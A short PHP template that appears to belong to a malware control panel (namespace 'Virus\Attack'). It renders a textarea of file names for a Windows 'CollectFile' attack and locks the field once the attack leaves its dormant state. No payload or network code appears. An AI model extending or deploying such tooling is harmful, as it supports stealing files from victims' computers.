<?php

use Kelvinho\Virus\Attack\AttackBase;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile\CollectFile $attack */

?>
<label for="fileNames">Files</label><textarea id="fileNames" rows="12" cols="80" class="w3-input"
                                              style="resize: vertical;"<?php echo($attack->getStatus() != AttackBase::STATUS_DORMANT ? "disabled" : ""); ?>><?php echo join("\n", $attack->getFileNames()); ?></textarea>
<br>